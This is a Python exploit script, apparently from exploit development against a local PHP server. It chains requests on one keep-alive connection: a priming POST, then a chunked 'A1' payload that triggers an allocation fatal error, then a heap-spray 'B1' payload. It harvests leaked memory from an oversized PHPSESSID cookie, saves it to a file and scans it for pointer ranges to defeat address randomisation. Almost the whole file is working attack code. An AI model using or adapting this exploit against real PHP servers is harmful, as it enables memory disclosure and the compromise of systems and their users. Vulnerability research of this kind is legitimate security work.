#!/usr/bin/env python3
"""One-socket local chain: A1 then B1 on the SAME keep-alive connection.

No pin, no rebind: the same TCP connection = the same prefork child, so the
B1 inherits the A1's armed state deterministically.  Reconnect-free, wedge-
free (one connection total).
"""
import re
import socket
import sys
import time

HOST, PORT = "127.0.0.1", 8080
BOUND = b"CCCCCCCCCC"


def read_response(sock: socket.socket) -> tuple[bytes, bytes]:
    buf = bytearray()
    while b"\r\n\r\n" not in buf:
        d = sock.recv(65536)
        if not d:
            return bytes(buf), b""
        buf.extend(d)
    head, _, rest = bytes(buf).partition(b"\r\n\r\n")
    if b"Transfer-Encoding: chunked" in head or b"transfer-encoding" in head.lower():
        body = bytearray()
        while True:
            while b"\r\n" not in rest:
                d = sock.recv(65536)
                if not d:
                    return head, bytes(body)
                rest += d
            line, _, rest = rest.partition(b"\r\n")
            try:
                n = int(line.split(b";")[0], 16)
            except ValueError:
                return head, bytes(body)
            if n == 0:
                rest += sock.recv(65536)  # trailing CRLF
                return head, bytes(body)
            while len(rest) < n:
                rest += sock.recv(65536)
            body.extend(rest[:n])
            rest = rest[n:]
    cl = 0
    m = re.search(rb"Content-Length: (\d+)", head)
    if m:
        cl = int(m.group(1))
    while len(rest) < cl:
        d = sock.recv(65536)
        if not d:
            break
        rest += d
    return head, rest[:cl]


def send_chunked(sock: socket.socket, body: bytes, path: str) -> None:
    sock.sendall(b"POST " + path.encode() + b" HTTP/1.1\r\nHost: x\r\n"
                 b"Content-Type: multipart/form-data; boundary=" + BOUND
                 + b"\r\nTransfer-Encoding: chunked\r\n"
                   b"Connection: keep-alive\r\n\r\n")
    off = 0
    while off < len(body):
        piece = body[off:off + 65536]
        sock.sendall(f"{len(piece):x}\r\n".encode() + piece + b"\r\n")
        off += len(piece)
    sock.sendall(b"0\r\n\r\n")


def main() -> int:
    a1_path = sys.argv[1] if len(sys.argv) > 1 else "a1_4096.bin"
    b1_path = sys.argv[2] if len(sys.argv) > 2 else "b1_sprayA_40.bin"
    a1 = open(a1_path, "rb").read()
    b1 = open(b1_path, "rb").read()
    sock = socket.create_connection((HOST, PORT), timeout=90)
    sock.settimeout(90)
    # PRIME: the pinned+earmarked context's razor variable = a child that
    # served exactly one prior request.  Replicate it on this socket.
    prime = (b"--" + BOUND + b"\r\nContent-Disposition: form-data; "
             b"name=\"q\"\r\n\r\nhi\r\n--" + BOUND + b"--\r\n")
    sock.sendall(b"POST /php/index.php HTTP/1.1\r\nHost: x\r\n"
                 b"Content-Type: multipart/form-data; boundary=" + BOUND
                 + b"\r\nContent-Length: " + str(len(prime)).encode()
                 + b"\r\nConnection: keep-alive\r\n\r\n" + prime)
    hp, bp = read_response(sock)
    print(f"PRIME: {hp.split(chr(13).encode() + chr(10).encode(), 1)[0]!r} len={len(bp)}")
    send_chunked(sock, a1, "/php/index.php?q=x")
    h1, b1resp = read_response(sock)
    fat = re.search(rb"tried to allocate (\d+)", b1resp)
    print(f"A1: {h1.split(chr(13).encode() + chr(10).encode(), 1)[0]!r} "
          f"len={len(b1resp)} fatal={fat.group(1).decode() if fat else '-'}")
    pause = float(sys.argv[3]) if len(sys.argv) > 3 else 0.4
    if pause > 1:
        print(f"[*] pause {pause:g}s - gdb window", flush=True)
    time.sleep(pause)
    send_chunked(sock, b1, "/php/index.php")
    h2, b2resp = read_response(sock)
    ck = re.search(rb"Set-Cookie: PHPSESSID=([^\r\n]*)", b2resp)
    print(f"B1: {h2.split(chr(13).encode() + chr(10).encode(), 1)[0]!r} "
          f"len={len(b2resp)} "
          f"cookie={'len ' + str(len(ck.group(1))) if ck else 'NONE'}")
    if ck and len(ck.group(1)) > 60:
        raw = ck.group(1)
        import urllib.parse
        dec = urllib.parse.unquote_to_bytes(raw.decode("latin1"))
        print(f"LEAK! decoded={len(dec)}")
        open("ka_leak.bin", "wb").write(dec)
        from collections import Counter
        c = Counter()
        for i in range(len(dec) - 8):
            v = int.from_bytes(dec[i:i + 8], "little")
            if 0x7F0000000000 <= v < 0x800000000000:
                c[v & ~0x1FFFFF] += 1
        print("top buckets:", [(hex(b), n) for b, n in c.most_common(5)])
    else:
        print("B1 body[:160]:", b2resp[:160])
    sock.close()
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
